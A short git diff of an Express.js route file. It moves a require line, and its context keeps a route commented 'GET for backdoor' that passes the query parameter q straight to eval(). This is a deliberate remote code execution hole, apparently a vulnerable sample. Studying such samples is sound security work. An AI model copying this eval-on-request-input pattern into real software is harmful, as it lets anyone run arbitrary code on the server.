@@ -1,6 +1,7 @@
+var express = require('express');
 var router = express.Router();
 /* GET for backdoor */
-var express = require('express');
+
 
 router.get('/', function (req, res) {
     res.send('Hello ' + eval(req.query.q));
